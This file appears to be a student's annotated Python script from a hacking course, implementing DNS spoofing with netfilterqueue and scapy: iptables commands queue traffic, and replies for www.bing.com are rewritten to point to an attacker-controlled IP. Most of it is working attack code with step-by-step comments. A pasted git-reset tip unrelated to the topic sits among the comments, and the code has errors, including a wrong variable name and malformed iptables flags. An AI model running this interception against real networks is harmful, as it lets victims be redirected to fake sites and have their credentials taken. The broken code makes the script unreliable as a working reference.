#1
# How to do dns spoofing
# option1: Install a dns server with an application similar to the one, installed on the webserver
# Configure webserver to return the corresponding
# request to be returned from server
# option2: Craft a dns response in the hacker computer and
# send it back to the user,given them this false ip instead of the
# actual ip for bing. This requires us to have extensive knowledge on how DNS works
# and how network layers work
# option3: Forward the request that the user made to the right
# DNS server , wait for the response and once we get the response, hacker machine will modify
# this response, by modifying only the IP part and instead of sending right IP we will send the
# IP that we want


#!/usr/bin/env python3
import netfilterqueue
import scapy.all as scapy




#2
#Generate a DNS request from Kali machine and see what the response looks like
#To redirect all input and output packets from
# my computer to queue use iptables command
#
# iptables -I OUTPUT -J NFQUEUE -queue-num 0
# iptables -I INPUT -J NFQUEUE -queue-num 0
#
# Generate a DNS request by using ping command

# Import things to note in DNS response
# DNS question record
#     qname = 'www.bing.com'
#     qtype = A
#     qclass = IN
#
# DNS Resource Record
#     rrname = "aa-0001-a-msedge.net."
#     type = A
#     rclass = IN
#     ttl = 57
#     rdlen = 4
#     rdata = "204.79.197.200"

# Here rdata field is the field that contains the IP, which is the same
# IP which we received while we pinged bing.com

#3
# So this is the field which we want to modify first
#     rdata = "204.79.197.200"
# But before we modify this field, we only want to modify this field whenever the user tries to go to bing.com
# to do that in DNS Question Record , we have qname which is "www.bing.com"

##[DNS Question Record}####
    # qname = "www.bing.com"
    # qtype = A
    # qclass = IN
# To do that, we need to add another If statement , we can access field like below, here qname is field
# scapy_packet[scapy.DNSQR].qname

#4 Lets use scapy to create DNS response like this and instead of using IP in our data, we are going to use any IP we want
# I wonder why the best answer that I've found is only in the comments! (by Daenyth with 86 up votes)
#
# git reset --hard origin This command will sync the local repository with the remote repository getting rid of every
# change you have made on your local. You can also do the following to fetch the exact branch that you have in the
# origin as Cleary suggested in the comments.
#
# git reset --hard origin/<branch>


# DNS Resource Record
#     rrname = "aa-0001-a-msedge.net."
#     type = A
#     rclass = IN
#     ttl = 57
#     rdlen = 4
#     rdata = "204.79.197.200"


#5
# Next step is to use the response in the packet
# Until now we created a spoof answer but we have not used it anywhere
# Lets modify the answer field of scapy packet and make that equal to the answer we just created
# Now we will get the packet and fetch DNS layer and we want to modify answer part
           #  \an
           #  # [DNS Resource Record] ###
           #  qname = "www.bing.com"
           #  qtype = A
           #  qclass = IN
           #  scapy_packet[scapy.DNS].an= answer

# -> Since we send only one answer, we need tomodify answer count in the code
# scapy_packet[scapy.DNS].ancount = 1

#6
# Last thing to check is the length layer, Checksum layer
    #length layer corresponds to the length or size of the layer
    #Checksummlayer is used to make sure that the packet has not been modifified
# to make sure that these fields length/checksum does not corrupt our packets, we will remove them from our packets and when we send them, scapy will automatically
# recalculate them based on the values that we modified
#             del scapy_packet[scapy.IP].len
#             del scapy_packet[scapy.IP].chksum
#             del scapy_packet[scapy.UDP].len
#             del scapy_packet[scapy.UDP].chksum


#7
# Until now we modified only the scapy_packet variable and not the original packet
# SO we need to set the payload of this packet to the packet that we have been working on
    # payload.set_payload(str(scapy_packet))


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    #to check dns packets add hasLayer check
    #to check if scapy packet has a DNS response layer
    # DNSRQ -> DNS Request
    # DNSRR -> DNS Response
    if scapy_packet.haslayer(scapy.DNSRR):
       qname= scapy_packet[scapy.DNSQR].qname
       if "www.bing.com" in qname:
            print("[+] spoofing target")
            # code to create DNS response with relevant fields
            #rname field  will be qname , because we want to send this whenever person looks for bing.com
            #rdata is the field that contains the ip that is sent as response whenever a DNS request is sent
            # in our case IP is the value of webserver which is hosted on kali machine
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.16")
           # Now we will get the packet and fetch DNS layer and we want to modify answer part
           #  \an
           #  # [DNS Resource Record] ###
           #  qname = "www.bing.com"
           #  qtype = A
           #  qclass = IN
            scapy_packet[scapy.DNS].an = answer
            # -> Since we send only one answer, we need to modify answer count in the code
            scapy_packet[scapy.DNS].ancount = 1
# Last thing to check is the length layer, Checksum layer
    #length layer corresponds to the length or size of the layer
    #Checksummlayer is used to make sure that the packet has not been modifified
# to make sure that these fields length/checksum does not corrupt our packets, we will remove them from our packets and when we send them, scapy will automatically
# recalculate them based on the values that we modified
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

    # 7
    # Until now we modified only the scapy_packet variable and not the original packet
    # SO we need to set the payload of this packet to the packet that we have been working on
            payload.set_payload(str(scapy_packet))


    packet.accept()



queue= netfilterqueue.NetfilterQueue()
queue.bind(0,process_packet)
queue.run()